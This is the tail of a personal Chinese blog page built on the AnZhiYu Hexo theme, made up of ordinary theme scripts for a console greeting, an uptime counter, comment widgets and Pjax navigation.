title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8923547078" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8923547078&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/js/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("12/01/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎来到My Blog!`,
+    `生活明朗, 万物可爱`,
+    `
+    ████████╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗███████╗
+    ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║ ██╔╝██╔════╝
+       ██║   ███████║█████╔╝ ███████║█████╔╝ █████╗  
+       ██║   ██╔══██║██╔═██╗ ██╔══██║██╔═██╗ ██╔══╝  
+       ██║   ██║  ██║██║  ██╗██║  ██║██║  ██╗███████╗
+       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2022 By Takake V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【骇客】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
+  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
+  var now = new Date();
+  var dnum;
+  var hnum;
+  var mnum;
+  var snum;
+  var nowHour;
+
+  // 计算并更新天数、小时数、分钟数和秒数
+  function updateTime() {
+    now = new Date(); // 更新 now 的值
+    nowHour = now.getHours(); // 更新 nowHour 的值
+    var days = (now - grt) / 1000 / 60 / 60 / 24;
+    dnum = Math.floor(days);
+    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+      hnum = "0" + hnum;
+    }
+    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+      mnum = "0" + mnum;
+    }
+    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+      snum = "0" + snum;
+    }
+  }
+
+  // 更新网页中显示的网站运行时间
+  function updateHtml() {
+    const footer = document.getElementById("footer");
+    if (!footer) return
+    let currentTimeHtml = "";
+    if (nowHour < 18 && nowHour >= 9) {
+      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    } else {
+      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
+      let img = document.querySelector("#workboard .workSituationImg");
+      if (img != null) {
+        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
+        img.title = "下班玩人工智能，嘿嘿~";
+        img.alt = "下班玩人工智能，嘿嘿~";
+      }
+
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    }
+
+    if (document.getElementById("runtimeTextTip")) {
+      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
+    }
+  }
+
+  setInterval(() => {
+    updateTime();
+    updateHtml();
+  }, 1000);
+})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "vister@takake.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    const close = () => {
+      Chatra('minimizeWidget')
+      Chatra('hide')
+    }
+
+    const open = () => {
+      Chatra('openChat', true)
+      Chatra('show')
+    }
+
+    window.ChatraSetup = {
+      startHidden: true
+    }
+  
+    window.chatBtnFn = () => {
+      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
+      isShow ? close() : open()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => {
+        Chatra('hide')
+      },
+      show: () => {
+        Chatra('show')
+      }
+    }
+  }
+
+  (function(d, w, c) {
+    w.ChatraID = 'MYtmap9meYHQGdDTJ'
+    var s = d.createElement('script')
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments)
+    }
+    s.async = true
+    s.src = 'https://call.chatra.io/chatra.js'
+    if (d.head) d.head.appendChild(s)
+  })(document, window, 'Chatra')
+
+})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
